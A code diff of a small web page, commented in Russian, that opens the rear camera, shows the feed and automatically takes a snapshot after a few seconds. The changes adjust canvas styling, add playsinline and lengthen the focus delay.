@@ -18,13 +18,16 @@
             width: 100%;
             height: auto;
         }
+        canvas {
+            display: none; /* Прячем canvas */
+        }
     </style>
 </head>
 <body>
 
 <!-- Видео-элемент для трансляции с камеры -->
-<video id="video" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
     const video = document.getElementById('video');
@@ -34,15 +37,17 @@
     // Функция запроса доступа к камере
     function startCamera() {
         navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment' }  // Используем заднюю камеру
+            video: { facingMode: 'environment' }  // Используем заднюю камеру, если доступна
         })
         .then(stream => {
             video.srcObject = stream;
-            
+
             // После загрузки видео делаем снимок
             video.onloadedmetadata = () => {
-                // Ожидание 2 секунды, чтобы камера сфокусировалась
-                setTimeout(capturePhoto, 2000);
+                // Ожидание 3 секунды для того, чтобы камера успела сфокусироваться
+                setTimeout(() => {
+                    capturePhoto();
+                }, 3000); // Увеличено до 3 секунд
             };
         })
         .catch(err => {
